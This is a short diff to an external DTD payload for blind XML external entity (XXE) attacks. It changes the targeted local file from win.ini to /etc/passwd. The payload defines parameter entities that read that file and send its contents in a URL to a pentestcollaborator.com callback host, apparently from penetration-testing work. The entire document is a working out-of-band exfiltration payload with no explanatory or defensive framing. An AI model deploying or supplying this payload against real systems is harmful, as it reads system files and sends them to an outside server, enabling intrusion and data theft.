@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///c://windows/win.ini">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://a0bl36aekali3o2bboznblsygpmfa4.pentestcollaborator.com/?x=%file;'>">
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://x97eaubbujvovz8r0hdxz61yspyjm8.pentestcollaborator.com/?x=%file;'>">
 %eval;
 %exfiltrate;
